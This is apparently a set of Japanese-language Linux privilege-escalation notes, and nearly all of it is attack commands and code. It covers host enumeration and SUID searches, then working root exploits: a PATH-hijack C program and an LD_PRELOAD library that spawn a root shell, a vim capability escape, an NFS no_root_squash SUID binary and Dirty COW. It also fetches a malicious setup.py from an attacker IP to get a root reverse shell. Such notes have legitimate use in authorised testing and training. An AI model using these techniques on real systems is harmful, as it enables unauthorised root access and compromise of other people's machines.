# 権限昇格

## Enumeration

### ホスト情報

```shell
hostname
uname -a
cat /proc/version
cat /etc/issue
cat /etc/passwd
```

### プロセス

```shell
# 全プロセス、ツリー状
ps aux
ps axjf
```

### 環境変数

```shell
env
```

### ユーザーの権限とグループ

```shell
# 他のユーザーも確認できる
id <user>
```

### 特定ユーザーが所有するファイル一覧

```shell
find / -user <name> -type f 2>/dev/null
```

### SUID が設定されているファイルを検索

```shell
# 環境によって動作が変わるので両方試す
$ find / -perm 04000 -type f -ls 2>/dev/null
# or
$ find / -perm -u=s -type f -ls 2>/dev/null

# SGIDはこう
$ find / -perm 02000 -type f -ls 2>/dev/null
```

### 書き込み可能なディレクトリを検索

```shell
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

### .bash_history

```shell
cat .bash_history
```

### キーワードでファイル検索

-I でバイナリファイルを除き、/dev/null でファイル名も出力されるようにしている

```shell
find . -type f -exec grep -i -I "ABCDE" {} /dev/null \;
```

### linux-exploit-suggester

```shell
cd /usr/share/linux-exploit-suggester
./linux-exploit-suggester.sh -k 2.6.32
```

### ネットワーク

```shell
ifconfig
ip route
netstat -a
```

### 自動 Enum ツール

[LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)  
[LinEnum](https://github.com/rebootuser/LinEnum)  
[LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)  
[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)  
[Linux Priv Checker](https://github.com/linted/linuxprivchecker)

## suid 付きプログラムの解析

suid や sudo を設定してはいけないコマンド一覧  
[GTFOBins](https://gtfobins.github.io/)

### プログラムが読み込む so やその他のファイル 等を調べる

so を配置可能な場合、so の初期化処理で任意のコードを実行できる

```shell
strace ../bin/foo 2>&1

# grep
strace ../bin/foo 2>&1 | grep -i -E "open|access|no such file"
```

### プログラムに含まれる文字列を調べる

```shell
$ strings ../bin/foo
abc
...
service httpd start
...
```

### PATH 挿入による実行ファイル差し替え

```shell
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH

# serviceを実行するのが分かっているSUID付きのプログラム
../bin/foo
```

### エディターなどに SUID が付いている場合

```shell
# パスワードハッシュを出力
openssl passwd -1 -salt SALT password1

# passwdに追加
nano /etc/passwd
```

## sudo 関連

```shell
# id コマンドでsudoグループに入っているか確認できる
id

# 権限のないユーザーが実行するとインシデント通知が出る可能性があるので注意！
sudo -l
```

### env_keep+=LD_PRELOAD が許可されている場合

x.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

/* soロード時に呼ばれる */
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

/* 現在はコンストラクタ属性による初期化の方が強く推奨されており、互換性も高い
__attribute__((constructor))
void initialize_library() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
*/
```

```shell
$ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
$ sudo LD_PRELOAD=/tmp/x.so nmap
#
```

### sudo pip install が許可されている場合

不正な setup.py を使うことで、root でリバースシェルの起動が可能  
https://github.com/0x00-0x00/FakePip/tree/master

```shell
wget http://<ip>/setup.py
sudo pip install . --upgrade
```

（ちなみに）ユーザーごとにインストールしたい場合はこれでよい

```shell
pip install --user
```

## ファイルキャパビリティ

```shell
# キャパビリティが付いているファイルを検索
getcap -r / 2>/dev/null
（出力例）
/home/karen/vim = cap_setuid+ep

# vimにsetuidキャパビリティが付いているとして
./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## cron 関連

```shell
cat /etc/crontab

ls -al /etc/cron*
```

## NFS (ネットワークファイルシステム)

（ターゲット）no_root_squash オプションが設定されていないか

```shell
$ cat /etc/exports
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

（攻撃マシン）マウント可能な共有を列挙

```shell
$ showmount -e 10.10.17.160
Export list for 10.10.17.160:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

（攻撃マシン）

```shell
# マウント
$ mkdir /tmp/targetbackup
$ sudo mount -o rw <ip>:/home/backup /tmp/targetbackup
$ sudo chmod 777 /tmp/targetbackup
$ cd /tmp/targetbackup

# マウントしているので攻撃マシンでもコンパイルできるが、
# 環境の違いによりターゲット側で実行したらエラーになる可能性がある事に注意
$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > poc.c
$ gcc poc.c -o poc

# no_root_squash 設定のため、SUID設定できる
$ chmod +s ./poc

$ ls -al
total 24
drwxrwxrwx  2 root root  4096 Dec 18 03:39 .
drwxrwxrwt 15 root root   340 Dec 18 03:39 ..
-rwsrwsr-x  1 kali kali 16056 Dec 18 03:39 poc
-rw-rw-r--  1 kali kali    68 Dec 18 03:39 poc.c
```

## ツール

### linPEAS

サジェスターツール  
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

```shell
wget http://<ip>/linpeas.sh
chmod +x ./linpeas.sh
./linpeas.sh
```

### dirtycow

有名特権昇格ツール  
https://www.exploit-db.com/download/40611

```shell
$ gcc cow.c -pthread -o dcw
$ ./dcw
^C
$ pwd
#
```
